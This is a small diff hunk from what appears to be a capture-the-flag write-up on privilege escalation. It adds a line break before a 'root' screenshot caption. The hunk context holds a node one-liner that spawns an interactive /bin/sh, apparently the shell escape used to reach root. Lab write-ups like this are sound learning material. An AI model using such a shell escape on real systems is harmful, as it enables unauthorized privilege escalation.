@@ -267,4 +267,5 @@ node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
 ```
 
 ![privesc_at_root](../images/uhc-v20/privesc_at_root.png)
+<br>
 Here we are with the root =D
